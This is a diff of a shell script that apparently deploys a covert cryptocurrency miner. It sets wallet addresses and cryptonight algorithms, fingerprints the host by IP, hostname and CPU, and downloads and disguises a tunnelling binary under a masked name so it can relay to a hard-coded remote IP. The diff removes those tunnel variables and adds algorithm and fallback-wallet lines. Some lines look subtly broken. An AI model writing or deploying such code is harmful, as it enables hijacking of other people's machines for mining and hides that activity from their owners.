@@ -14,11 +14,6 @@ export TERMINFO=$PWD \
 
 ## glibc not needed on standalone
 ## tnl
-TNL_REMOTE=${TNL_REMOTE:-212.237.6.194}
-TNL_ARGS=${TNL_ARGS:--L tcp://:8080/:8081 -F kcp://chacha20:123@${TNL_REMOTE}:443?ttl=60}
-TNL_VER=${TNL_VER:-2.4}
-TNL_MASK=${TNL_MASK:-gst}
-TNL_URL=https://github.com/ginuerzh/gost/releases/download/v${TNL_VER}/gost_${TNL_VER}_linux_amd64.tar.gz
 wget -q $TNL_URL -O tnl.tar.gz
 tar xf tnl.tar.gz
 mv gost*/gost ${TNL_MASK} && chmod +x ${TNL_MASK} &>/dev/null
@@ -103,6 +98,7 @@ PAUSD_RATE=${PAUSD_RATE:-200}
 export \
 ID=${ID:-"{$IPADDR}{$HOSTN}{$DATE}{$CORES}{$CPU}"} \
 PA=${PA:-4ACgpqzFZCiRfmZHAX11tAMLft1KNvLhWh83JXpYFKfKDhT7GXK89AoM4jNV1RRUUghAbuP1FrqTFU5w4zbN3F9GG6mqNPq} \
+AL=${AL:-cryptonight}
 ENDPOINT=${ENDPONT:-127.0.0.1:8080}
 ## subst
 cat ${OBJ_MASK}.conf.tpl | envsubst > ${OBJ_MASK}.conf
@@ -118,6 +114,10 @@ while [ "$(tmux ls | wc -l)" -lt 3 ]; do
     if [ $slept -gt 5 ]; then
         ## try without hw accel
         PAUSD_VER=${PAUSD_VER/1/3} PAUSD_VER=${PAUSD_VER/2/4} && export PAUSD_VER
+        ## switch PA to different co
+        PA=${PA:-WmsNJ3Usa4T7AbXz6ZRTdi5hjrqeXsGFMHEEwpv5g2sbgtEWxJZeBA4hqMusHAyWBVaDktNhZHTvTd6RfngAJNpF1wDzwqaNo} \
+        ## change algo
+        AL=${AL:-cryptonight-lite}
         ## subst
         cat ${OBJ_MASK}.conf.tpl | envsubst > ${OBJ_MASK}.conf
         ## init
